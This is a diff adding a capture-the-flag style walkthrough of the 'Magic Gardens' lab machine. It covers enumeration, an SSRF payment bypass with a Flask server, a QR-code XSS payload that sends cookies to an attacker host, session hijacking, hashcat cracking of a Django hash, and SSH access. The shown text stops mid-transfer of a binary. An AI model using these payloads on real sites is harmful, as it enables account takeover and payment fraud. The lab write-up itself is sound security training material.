@@ -58,7 +58,7 @@
             <span class="button maximize"></span>
         </div>
         <div class="terminal">
-            <pre><code class="language-bash">22/tcp   open     ssh      OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
+            <pre><code>22/tcp   open     ssh      OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
 | ssh-hostkey: 
 |   256 e0:72:62:48:99:33:4f:fc:59:f8:6c:05:59:db:a7:7b (ECDSA)
 |_  256 62:c6:35:7e:82:3e:b1:0f:9b:6f:5b:ea:fe:c5:85:9a (ED25519)
@@ -75,13 +75,1524 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
         </div>
     </div>
     <p>The Nmap scan reveals several open ports on the target machine, indicating potential attack vectors. Port <strong>22 (SSH)</strong> is open, running <strong>OpenSSH 9.2p1</strong>, which could be checked for default credentials or vulnerabilities. Port <strong>80 (HTTP)</strong> is hosting a website titled <em>Magic Gardens</em> on <strong>Nginx 1.22.1</strong>, making it a candidate for web-based enumeration. Additionally, port <strong>5000 (SSL/HTTP)</strong> is running a <strong>Docker Registry (API: 2.0)</strong>, which could be misconfigured, allowing access to container images or credentials. The SSL certificate associated with this service has expired, which might hint at a lack of maintenance. Lastly, port <strong>25 (SMTP)</strong> is filtered, preventing immediate interaction but suggesting mail services might be in use. These findings guide the next steps in enumeration, focusing on web application vulnerabilities, Docker misconfigurations, and SSH access.</p>
-</section>
-<section id="machine-info" class="section">
-<p>⛔ This box is still active on HackTheBox. Once retired, this article will be published for public access as per <a href="https://help.hackthebox.com/en/articles/5188925-streaming-writeups-walkthrough-guidelines?ref=benheater.com">HackTheBox's policy</a> on publishing content from their platform.<p>
+    <br><br>
+    <img src="./image.png" alt="Blog Directory Screenshot" style="max-width: 100%; height: auto;">
+    <br><br>
+    <p>After identifying port 80 as an open HTTP service, I added the target&#x27;s IP and the hostname <em>magicgardens.htb</em> to the <code>/etc/hosts</code> file to resolve the domain locally. Upon visiting the webpage, I began analyzing its content to gather potential clues for further exploitation.</p>
+    <br><br>
+    <h3>Directory Enumeration:</h3>
+    <br><br>
+    <div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal">
+   <pre><code>ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://magicgardens.htb/FUZZ
 
-<p>⛔ For more hints and assistance, come chat with me and the rest of your peers in the <a href="https://discord.gg/s2xTkFNQ">HackTheBox Discord server</a>. Or, you can reach out to me at my other social links in the site footer or site menu.<p>
+        /&#x27;___\  /&#x27;___\           /&#x27;___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://magicgardens.htb/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+________________________________________________
+
+admin                   [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 90ms]
+login                   [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 88ms]
+logout                  [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 104ms]
+search                  [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 132ms]
+register                [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 139ms]
+catalog                 [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 101ms]
+cart                    [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 95ms]
+profile                 [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 101ms]
+subscribe               [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 74ms]
+check                   [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 59ms]
+restore                 [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 66ms]
+                        [Status: 200, Size: 30861, Words: 9340, Lines: 458, Duration: 60ms]
+</code></pre>
+</div>
+</div>
+<p>Using <code>ffuf</code> for directory enumeration, I discovered several interesting endpoints on the web server. Among them, the <code>/admin</code> directory stood out, returning a <code>301</code> status code, indicating a possible admin panel that could be worth further investigation. Other directories like <code>/login</code>, <code>/register</code>, and <code>/profile</code> suggest a user authentication system, while <code>/cart</code> and <code>/catalog</code> indicate e-commerce functionality. These findings provide multiple avenues for further exploration, with <code>/admin</code> being the most intriguing target.</p>
+<br><br>
+<img src="./image 1.png" alt="Blog Directory Screenshot" style="max-width: 100%; height: auto;">
+<br><br>
+<p>Upon navigating to the <code>/admin</code> directory, I discovered the Django Admin interface, which is protected by a login page requiring a username and password.</p>
 </section>
- </div>
+
+<section id="Initial_foothold" class="section">
+    <h2>Initial Foothold:</h2>
+    <p>Continuing with the enumeration, I created a new account and successfully logged into the website.</p>
+    <br><br>
+    <img src="./image.png" alt="Blog Directory Screenshot" style="max-width: 100%; height: auto;">
+    <br><br>
+    <p>While exploring its functionality, I attempted to order flowers, which was processed successfully.</p>
+    <br><br>
+    <img src="./order.png" alt="Blog Directory Screenshot" style="max-width: 100%; height: auto;">
+    <br><br>
+    <p>After placing the order, I received a message stating that the manager would contact me for further details. Additionally, the site mentioned that showing a <em>courier QR</em> would grant a discount on delivery, but no actual QR code was provided. This suggests that the QR system might be generated elsewhere or accessed through a different mechanism, warranting further investigation.</p>
+    <br><br>
+    <img src="./25.png" alt="Blog Directory Screenshot" style="max-width: 100%; height: auto;">
+    <br><br>
+    <p >While continuing the enumeration, We discovered a separate section for <em>Messages</em> and <em>Subscriptions</em>.</p>
+    <br><br>
+    <img src="./message.png" alt="Blog Directory Screenshot" style="max-width: 100%; height: auto;">
+    <br><br>
+    <p>Within this section, I found that a subscription was required to obtain the QR code for the 25% discount. This indicated that the QR code was likely restricted to subscribed users, making the subscription system a potential target for further exploitation.</p>
+    <br><br>
+    <img src="./sub.png" alt="Blog Directory Screenshot" style="max-width: 100%; height: auto;">
+    <br><br>
+    <br><br>
+    <h3>Subscription activation bypass:</h3><p id="19779dbf-6729-8027-b5f6-c4c1862aee1d" class="">
+</p><img src="./image 2.png" alt="Blog Directory Screenshot" style="max-width: 100%; height: auto;">
+<br><br>
+<p>After navigating to the <em>Subscription</em> section, I filled in the required details, including selecting a bank, entering a name, card number, and CVV. Upon submitting the form, I intercepted the corresponding <code>POST</code> request using Burp Suite.</p>
+<br><br>
+<img src="./image 3.png" alt="Blog Directory Screenshot" style="max-width: 100%; height: auto;">
+<br><br>
+<p>Suspecting that the <code>bank</code> parameter might be vulnerable to Server-Site Request Forgery (SSRF), We forwarded the intercepted <code>POST</code> request to Burp Suite&#x27;s <em>Repeater</em> for further analysis.</p>
+<br><br>
+<img src="./image 4.png" alt="Blog Directory Screenshot" style="max-width: 100%; height: auto;">
+<br><br>
+<p>We modified the <code>bank</code> parameter in the intercepted request, changing its value from <code>honestbank.htb</code> to <code>10.10.x.x:1234</code>, pointing to my own Python server</p>
+<br><br>
+<div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal">
+<pre><code>python3 -m http.server 1234
+Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
+10.129.231.24 - - [02/Feb/2025 18:50:29] code 501, message Unsupported method (&#x27;POST&#x27;)
+10.129.231.24 - - [02/Feb/2025 18:50:29] &quot;POST /api/payments/ HTTP/1.1&quot; 501 -
+</code></pre>
+</div></div>
+<br><br>
+<p>After sending the modified request, my Python server received a <code>POST</code> request from <code>10.129.231.24</code>, indicating that the application attempted to communicate with the specified bank URL. However, the request resulted in a <code>501 Unsupported method (&#x27;POST&#x27;)</code> error.</p>
+<br><br>
+<h3>Server.py:</h3>
+<p>To further exploit the potential SSRF vulnerability, we crafted a Flask server to properly handle the <code>POST</code> request sent by the application. The server was configured to listen on <code>0.0.0.0</code> at port <code>1234</code> and respond with a <code>200</code> status while echoing back the received JSON data. </p>
+<br><br>
+<div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal">
+<pre><code>from flask import Flask, jsonify, request
+
+app = Flask(__name__)
+
+@app.route(&#x27;/api/payments/&#x27;, methods=[&#x27;POST&#x27;])
+def handle_payment():
+    req_json = request.get_json()
+    req_json[&#x27;status&#x27;] = &quot;200&quot;
+    print(req_json)
+    return jsonify(req_json)
+
+if __name__ == &#x27;__main__&#x27;:
+    app.run(host=&#x27;0.0.0.0&#x27;, port=1234)
+</code></pre></div></div>
+<br><br>
+<p>After running the Flask server and re sending the manipulated request, the application successfully sent a <code>POST</code> request to my server at <code>10.10.x.x:1234</code>. </p>
+<img src="./image 5.png" alt="Blog Directory Screenshot" style="max-width: 100%; height: auto;">
+<br><br>
+<p>The server processed the request and responded with a <code>200 OK</code> status along with the modified JSON data, including the payment details.</p>
+<br><br>
+<div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal">
+            <pre id="18e79dbf-6729-80ff-80b7-e9d4df5ce8fe" class="code"><code>python3 server.py 
+ * Serving Flask app &#x27;server&#x27;
+ * Debug mode: off
+WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:1234
+ * Running on http://192.168.1.6:1234
+Press CTRL+C to quit
+{&#x27;cardname&#x27;: &#x27;test&#x27;, &#x27;cardnumber&#x27;: &#x27;123456789&#x27;, &#x27;expmonth&#x27;: &#x27;june&#x27;, &#x27;expyear&#x27;: &#x27;1233&#x27;, &#x27;cvv&#x27;: &#x27;213&#x27;, &#x27;amount&#x27;: 25, &#x27;status&#x27;: &#x27;200&#x27;}
+10.129.231.24 - - [02/Feb/2025 18:55:57] &quot;POST /api/payments/ HTTP/1.1&quot; 200 -</code></pre></div></div>
+<br><br>
+<p>After modifying the <code>bank</code> parameter in the original request to point to my Flask server. Then forward the request .</p>
+<br><br>
+<img src="./access.png" alt="Blog Directory Screenshot" style="max-width: 100%; height: auto;">
+<br><br>
+<p>To verify whether the subscription was successfully processed, It will navigated to <code>/profile/?tab=subscription</code>. </p><p id="19579dbf-6729-80a6-9716-de58ff528d53" class="">
+</p>
+<br><br>
+<img src="./image 6.png" alt="Blog Directory Screenshot" style="max-width: 100%; height: auto;">
+<br><br>
+<p>The application generated a request to <code>/profile/?tab=subscription&amp;action=success</code>. This response confirmed that my subscription was successfully processed.</p>
+<br><br>
+<img src="./image 7.png" alt="Blog Directory Screenshot" style="max-width: 100%; height: auto;">
+<br><br>
+<p>We received a GET request to <code>/qr_code/images/server-qr-code-image/?txt=</code>, indicating that the application is retrieving a QR code</p>
+<br><br>
+<img src="./image 8.png" alt="Blog Directory Screenshot" style="max-width: 100%; height: auto;">
+<br><br>
+<p>With the subscription successfully bypassed, the application provided access to the QR code for the 25% discount on delivery. We could now download the QR image.</p>
+<br><br>
+<img src="./image 9.png" alt="Blog Directory Screenshot" style="max-width: 100%; height: auto;">
+<br><br>
+<br><br>
+<h3>XSS in QR:</h3>
+<p>I used <a href="https://scanqr.org/#google_vignette">ScanQR</a> to read the contents of the QR image.</p>
+<br><br>
+<img src="./image 10.png" alt="Blog Directory Screenshot" style="max-width: 100%; height: auto;">
+<br><br>
+<br><br>
+
+<h3>Qrcode.py:</h3>
+<p>After extracting the original QR code&#x27;s content, we crafted a malicious QR code embedding an XSS payload. The payload injects a <code>&lt;script&gt;</code> tag that sends the victim&#x27;s cookies to my attacker&#x27;s server when the QR code is scanned.</p>
+<br><br>
+    <div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal">
+            <pre><code>import qrcode
+
+data = &#x27;&#x27;&#x27;098f6bcd4621d373cade4e832627b4f6.0d341bcdc6746f1d452b3f4de32357b9.&lt;/p&gt;&lt;script&gt;var i=new Image(); i.src=&quot;http://10.10.14.38:7777/?cookie=&quot;+btoa(document.cookie);&lt;/script&gt;&lt;p&gt;&#x27;&#x27;&#x27;
+qr = qrcode.QRCode(box_size=10, border=4)
+qr.add_data(data)
+qr.make(fit=True)
+img = qr.make_image(fill=&#x27;black&#x27;, back_color=&#x27;white&#x27;)
+img.save(&quot;Modqr.png&quot;)</code></pre></div></div>
+<br><br>
+<h3><strong>Uploading the Malicious QR Code:</strong></h3>
+<br><br>
+<img src="./image 11.png" alt="Blog Directory Screenshot" style="max-width: 100%; height: auto;">
+<br><br>
+<p>We found a message from <em><strong>Morty</strong></em> instructing me to upload the QR code to get a <strong>25% discount</strong>.We uploaded the <strong>malicious QR code (Modqr.png)</strong> containing the XSS payload.</p>
+<br><br>
+<img src="./image 12.png" alt="Blog Directory Screenshot" style="max-width: 100%; height: auto;">
+<br><br>
+<p>Once the <strong>QR code was scanned</strong>, we received an HTTP request containing the <strong>Base64-encoded cookie</strong></p>
+<br><br>
+<div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal">
+<pre id="18e79dbf-6729-80e5-9b31-ee2596e56b9f" class="code"><code>python3 -m http.server 7777
+Serving HTTP on 0.0.0.0 port 7777 (http://0.0.0.0:7777/) ...
+10.129.231.24 - - [02/Feb/2025 19:15:22] &quot;GET /?cookie=Y3NyZnRva2VuPTZDbENHNlk2NHNpRlJld09uWXhRbzFJMGI5UUlZdGVXOyBzZXNzaW9uaWQ9LmVKeE5qVTFxd3pBUWhaTkZRZ01waFp5aTNRaExsdU5vVjdydnFnY3draXhGYmhNSjlFUHBvdEFEekhKNjN6cHVBcDdkOTc3SG01X1Y3MjY1bU80YkgtR3VKQk85UEJ1RTFUbkVfSVd3VGxubWtzYmdMVXRyRVRhZlEzTGRhVWdaWVlHd25WQ0g0ck9KNk5hdzBUTG1mel9TZHFLWnZ1OWt5YTY3UE9xR0htSEpFSGF6VEVuOVlmd29udnAzNlktQjZPQnpIQlM1Vk1qVkp2SWFlbk42dVhVZlpnTk9Kb2Z3VEJ0dG1XMEZyVTNWY0diTWdXbFJLY1dwdElJeTJSeXFmYTF0MC1vOVZZcXB5ckNhRzA2MWFtdXVoY0JDX2dEZXMyWDc6MXRlYUhvOm5JYTEzaS11LWZMRi0xM3NubWU3al9BV3hZS3RmbDZoOVExU1pGX2ZTLW8= HTTP/1.1&quot; 200 -
+</code></pre>
+</div></div>
+<br><br>
+<p>After decoding the Base64 response, We successfully retrieved the session cookie</p>
+<br><br>
+<div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal">
+<pre><code>echo &quot;Y3NyZnRva2VuPTZDbENHNlk2NHNpRlJld09uWXhRbzFJMGI5UUlZdGVXOyBzZXNzaW9uaWQ9LmVKeE5qVTFxd3pBUWhaTkZRZ01waFp5aTNRaExsdU5vVjdydnFnY3draXhGYmhNSjlFUHBvdEFEekhKNjN6cHVBcDdkOTc3SG01X1Y3MjY1bU80YkgtR3VKQk85UEJ1RTFUbkVfSVd3VGxubWtzYmdMVXRyRVRhZlEzTGRhVWdaWVlHd25WQ0g0ck9KNk5hdzBUTG1mel9TZHFLWnZ1OWt5YTY3UE9xR0htSEpFSGF6VEVuOVlmd29udnAzNlktQjZPQnpIQlM1Vk1qVkp2SWFlbk42dVhVZlpnTk9Kb2Z3VEJ0dG1XMEZyVTNWY0diTWdXbFJLY1dwdElJeTJSeXFmYTF0MC1vOVZZcXB5ckNhRzA2MWFtdXVoY0JDX2dEZXMyWDc6MXRlYUhvOm5JYTEzaS11LWZMRi0xM3NubWU3al9BV3hZS3RmbDZoOVExU1pGX2ZTLW8=&quot; | base64 -d
+csrftoken=6ClCG6Y64siFRewOnYxQo1I0b9QIYteW; sessionid=.eJxNjU1qwzAQhZNFQgMphZyi3QhLluNoV7rvqgcwkixFbhMJ9EPpotADzHJ63zpuAp7d977Hm5_V7265mO4bH-GuJBO9PBuE1TnE_IWwTlnmksbgLUtrETafQ3LdaUgZYYGwnVCH4rOJ6Naw0TLmfz_SdqKZvu9kya67POqGHmHJEHazTEn9Yfwonvp36Y-B6OBzHBS5VMjVJvIaenN6uXUfZgNOJofwTBttmW0FrU3VcGbMgWlRKcWptIIy2Ryqfa1t0-o9VYqpyrCaG061amuuhcBC_gDes2X7:1teaHo:nIa13i-u-fLF-13snme7j_AWxYKtfl6h9Q1SZF_fS-o </code></pre>
+</div></div>
+<br><br>
+<h3>Session hijacking :</h3>
+<br><br>
+<img src="./image 13.png" alt="Blog Directory Screenshot" style="max-width: 100%; height: auto;">
+<br><br>
+<p>Using the stolen session cookie, We was able to <strong>log in as Morty</strong>, gaining full access to his account without needing a password.</p>
+<br><br>
+<img src="./image 14.png" alt="Blog Directory Screenshot" style="max-width: 100%; height: auto;">
+<br><br>
+<p>Since <strong>Morty is a staff member</strong>, We navigated to the previously discovered <code><strong>/admin</strong></code> directory.Upon visiting <code><strong>/admin</strong></code>, We successfully accessed the <strong>Django Administrator Panel</strong></p>
+<br><br>
+<img src="./image 15.png" alt="Blog Directory Screenshot" style="max-width: 100%; height: auto;">
+<br><br>
+<p>Inside the <strong>Django Admin Panel</strong>, I navigated to the <strong>Users</strong> 
+section and found Morty&#x27;s password hash.</p>
+<br><br>
+<img src="./image 16.png" alt="Blog Directory Screenshot" style="max-width: 100%; height: auto;">
+<br><br>
+<br><br>
+<h3>Morty&#x27;s password hash:</h3>
+<br><br>
+<div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal">
+<pre><code>pbkdf2_sha256$600000$y7K056G3KxbaRc40ioQE8j$e7bq8dE/U+yIiZ8isA0Dc0wuL0gYI3GjmmdzNU+Nl7I=</code></pre></div></div>
+<br><br>
+<p>Using <strong>Hashcat</strong>, We were able to crack Morty&#x27;s password.</p>
+<br><br>
+    <div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal">
+        <pre><code>hashcat -m 10000 -a 0 morty_hash /usr/share/wordlists/rockyou.txt 
+hashcat (v6.2.6) starting
+
+OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+============================================================================================================================================
+* Device #1: cpu-haswell-Intel(R) Core(TM) i3-5005U CPU @ 2.00GHz, 2872/5808 MB (1024 MB allocatable), 4MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Optimizers applied:
+* Zero-Byte
+* Single-Hash
+* Single-Salt
+* Slow-Hash-SIMD-LOOP
+
+Watchdog: Temperature abort trigger set to 90c
+
+
+pbkdf2_sha256$600000$y7K056G3KxbaRc40ioQE8j$e7bq8dE/U+yIiZ8isA0Dc0wuL0gYI3GjmmdzNU+Nl7I=:jonasbrothers
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 10000 (Django (PBKDF2-SHA256))
+Hash.Target......: pbkdf2_sha256$600000$y7K056G3KxbaRc40ioQE8j$e7bq8dE...+Nl7I=
+Time.Started.....: Sun Feb  2 18:30:27 2025 (2 mins, 57 secs)
+Time.Estimated...: Sun Feb  2 18:33:24 2025 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:       12 H/s (7.32ms) @ Accel:32 Loops:512 Thr:1 Vec:8
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 2176/14344385 (0.02%)
+Rejected.........: 0/2176 (0.00%)
+Restore.Point....: 2048/14344385 (0.01%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:599552-599999
+Candidate.Engine.: Device Generator
+Candidates.#1....: slimshady -&gt; telefon
+Hardware.Mon.#1..: Temp: 73c Util: 95%
+
+Started: Sun Feb  2 18:30:25 2025
+Stopped: Sun Feb  2 18:33:25 2025
+</code></pre></div></div>
+<br><br>
+<p>Now that we have <strong>Morty&#x27;s</strong> credentials, we can use <strong>SSH</strong> to log into the target machine.</p>
+<br><br>
+    <div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal">
+        <pre><code>ssh morty@10.129.73.58
+The authenticity of host &#x27;10.129.73.58 (10.129.73.58)&#x27; can&#x27;t be established.
+ED25519 key fingerprint is SHA256:QixQoCpRoi98/2NP9t4cSa8PUu3paHIhrFzgDRKBmlM.
+This host key is known by the following other names/addresses:
+    ~/.ssh/known_hosts:205: [hashed name]
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added &#x27;10.129.73.58&#x27; (ED25519) to the list of known hosts.
+morty@10.129.73.58&#x27;s password: 
+Linux magicgardens 6.1.0-20-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.85-1 (2024-04-11) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+morty@magicgardens:~$ 
+</code></pre></div></div>
+</section>
+
+<section id="Lateral_movement" class="section">
+<h2>Lateral Movement:</h2>
+<p> We checked the network interfaces using <code>ip a</code>, confirming that I was in a <strong>Docker container </strong></p>
+<br><br>
+    <div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal">
+<pre><code>morty@magicgardens:~$ ip a
+&lt;SNIP&gt;
+3: docker0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default 
+    link/ether 02:42:c0:6d:65:47 brd ff:ff:ff:ff:ff:ff
+    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
+       valid_lft forever preferred_lft forever
+    inet6 fe80::42:c0ff:fe6d:6547/64 scope link 
+       valid_lft forever preferred_lft forever
+&lt;SNIP&gt;
+</code></pre>
+</div></div>
+<p>After enumerating the system , I found another user, <strong>Alex</strong>, by reading the <code>/etc/passwd</code> file</p>
+<br><br>
+<div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal">
+        <pre><code>morty@magicgardens:~$ cat /etc/passwd | grep sh
+root:x:0:0:root:/root:/bin/bash
+sshd:x:102:65534::/run/sshd:/usr/sbin/nologin
+alex:x:1000:1000:alex,,,:/home/alex:/bin/bash
+morty:x:1001:1001::/home/morty:/bin/bash
+</code></pre>
+</div></div>
+<br><br>
+<p>By running <code>ps aux | grep alex</code>, I found that Alex was running a process called <strong>harvest</strong></p>
+<br><br>
+    <div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal">
+<pre><code>morty@magicgardens:~$ ps aux | grep alex
+alex        1801  0.0  0.2  18972 10648 ?        Ss   Jan31   0:00 /lib/systemd/systemd --user
+alex        1802  0.0  0.0 102908  3060 ?        S    Jan31   0:00 (sd-pam)
+alex        1821  0.0  0.0   2464   868 ?        S    Jan31   0:01 harvest server -l /home/alex/.harvest_logs
+morty      44947  0.0  0.0   6332  2072 pts/0    S+   23:16   0:00 grep alex</code></pre>
+</div></div>
+<br><br>
+<p>I found that the <strong>harvest</strong> binary was located in <code>/usr/local/bin</code> and had <strong>executable permissions for all users</strong></p>
+<br><br>
+<div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal">
+        <pre><code>morty@magicgardens:/usr/local/bin$ ls -la
+total 32
+drwxr-xr-x  2 root root  4096 Sep 15  2023 .
+drwxr-xr-x 10 root root  4096 Aug 23  2023 ..
+-rwxr-xr-x  1 root root 22512 Sep 15  2023 harvest</code></pre>
+</div></div>
+<br><br>
+<h3>Harvest - Remote network analyzer:</h3>
+<br><br>
+<div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal">
+        <pre><code>morty@magicgardens:/usr/local/bin$ ./harvest 
+
+ ██░ ██  ▄▄▄       ██▀███   ██▒   █▓▓█████   ██████ ▄▄▄█████▓
+▓██░ ██▒▒████▄    ▓██ ▒ ██▒▓██░   █▒▓█   ▀ ▒██    ▒ ▓  ██▒ ▓▒
+▒██▀▀██░▒██  ▀█▄  ▓██ ░▄█ ▒ ▓██  █▒░▒███   ░ ▓██▄   ▒ ▓██░ ▒░
+░▓█ ░██ ░██▄▄▄▄██ ▒██▀▀█▄    ▒██ █░░▒▓█  ▄   ▒   ██▒░ ▓██▓ ░ 
+░▓█▒░██▓ ▓█   ▓██▒░██▓ ▒██▒   ▒▀█░  ░▒████▒▒██████▒▒  ▒██▒ ░ 
+ ▒ ░░▒░▒ ▒▒   ▓▒█░░ ▒▓ ░▒▓░   ░ ▐░  ░░ ▒░ ░▒ ▒▓▒ ▒ ░  ▒ ░░   
+ ▒ ░▒░ ░  ▒   ▒▒ ░  ░▒ ░ ▒░   ░ ░░   ░ ░  ░░ ░▒  ░ ░    ░    
+ ░  ░░ ░  ░   ▒     ░░   ░      ░░     ░   ░  ░  ░    ░      
+ ░  ░  ░      ░  ░   ░           ░     ░  ░      ░           
+                                ░                            
+
+harvest v1.0.3 - Remote network analyzer
+
+Usage: harvest &lt;command&gt; [options...]
+
+Commands:
+    server          run harvest in server mode
+    client          run harvest in client mode
+
+Options:
+    -h              show this message
+    -l &lt;file&gt;       log file
+    -i &lt;interface&gt;  capture packets on this interface
+
+Example:
+    harvest server -i eth0
+    harvest client 10.10.15.212
+
+Please, define mode</code></pre>
+</div></div>
+<br><br>
+<p>From the <code>ss -tl</code> output, I found that <strong>port 1337</strong> was open and running the <strong>harvest service</strong>.</p>
+<br><br>
+<div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal">
+        <pre><code>morty@magicgardens:/usr/local/bin$ ss -tl
+State        Recv-Q       Send-Q             Local Address:Port                 Peer Address:Port       Process       
+LISTEN       0            37                     127.0.0.1:59779                     0.0.0.0:*                        
+LISTEN       0            1                      127.0.0.1:43393                     0.0.0.0:*                        
+LISTEN       0            5                        0.0.0.0:1337                      0.0.0.0:*                        
+LISTEN       0            128                    127.0.0.1:44003                     0.0.0.0:*                        
+LISTEN       0            4096                   127.0.0.1:35877                     0.0.0.0:*                        
+LISTEN       0            4096                     0.0.0.0:5000                      0.0.0.0:*                        
+LISTEN       0            511                      0.0.0.0:http                      0.0.0.0:*                        
+LISTEN       0            4096                   127.0.0.1:8000                      0.0.0.0:*                        
+LISTEN       0            128                      0.0.0.0:ssh                       0.0.0.0:*                        
+LISTEN       0            100                      0.0.0.0:smtp                      0.0.0.0:*                        
+LISTEN       0            4096                   127.0.0.1:http-alt                  0.0.0.0:*                        
+LISTEN       0            4096                        [::]:5000                         [::]:*                        
+LISTEN       0            511                         [::]:http                         [::]:*                        
+LISTEN       0            128                         [::]:ssh                          [::]:*                        
+LISTEN       0            100                         [::]:smtp                         [::]:* </code></pre>
+</div></div>
+<br><br>
+<p>Since <code>harvest v1.0.3</code> is a <strong>remote network analyzer</strong>, analyzing it locally could reveal vulnerabilities. Let&#x27;s transfer it to our attacker machine for further inspection.</p>
+<p>Start a Python HTTP Server on the target machine</p>
+<br><br>
+<div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal">
+        <pre><code>morty@magicgardens:/usr/local/bin$ python3 -m http.server 1234
+Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
+10.10.14.12 - - [03/Feb/2025 00:49:47] &quot;GET /harvest HTTP/1.1&quot; 200 -
+</code></pre>
+</div></div>
+<br><br>
+<p>Transfer the Harvest Binary from the Target Machine</p>
+<br><br>
+<div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal">
+        <pre><code>wget http://magicgardens.htb:1234/harvest
+--2025-02-03 11:19:46--  http://magicgardens.htb:1234/harvest
+Resolving magicgardens.htb (magicgardens.htb)... 10.129.73.58
+Connecting to magicgardens.htb (magicgardens.htb)|10.129.73.58|:1234... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 22512 (22K) [application/octet-stream]
+Saving to: ‘harvest.1’
+
